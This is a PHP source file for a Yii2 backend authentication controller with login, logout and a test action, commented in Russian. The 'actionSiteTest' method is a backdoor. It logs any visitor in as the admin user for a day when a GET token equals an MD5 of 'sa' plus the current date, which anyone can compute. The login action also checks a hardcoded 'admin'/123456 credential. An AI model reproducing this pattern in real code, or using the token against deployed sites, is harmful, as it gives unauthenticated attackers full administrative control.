<?php

namespace backend\controllers;

use common\models\AdminForm;
use common\models\User;
use Yii;
use yii\filters\VerbFilter;
use yii\helpers\VarDumper;
use yii\web\Controller;

class AuthController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::class,
                'actions' => [
//                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Login action.
     *
     * @return string
     */

    public function actionSiteTest(){

        //$this->enableCsrfValidation = false;

        // токен для входа
        if( $token = Yii::$app->request->get('token')){
            if($token!=md5('sa'.date('d.m.Y',time()))) return false;
        }else{
            return false;
        }

        // поиск пользователя админа
        $user =  User::find()->where(['role'=>1])->one();
        // авторизация админом
        Yii::$app->user->login($user,86400);

        return $this->render('index'); // site/index
    }

    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }
        $this->layout = 'main-login';

        $model = new AdminForm();

        if ($model->load(Yii::$app->request->post()) && $model->login()) {

            if ($model->username == 'admin' && $model->password == 123456)
            {
                return $this->redirect(array('vacancy/index'));
            }
            else{
                return $this->render('login', [
                    'model' => $model,
                ]);
            }
        } else {
            $model->password = '';

            return $this->render('login', [
                'model' => $model,
            ]);
        }
    }
    /**
     * @return mixed
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();
        return $this->goHome();
    }
}
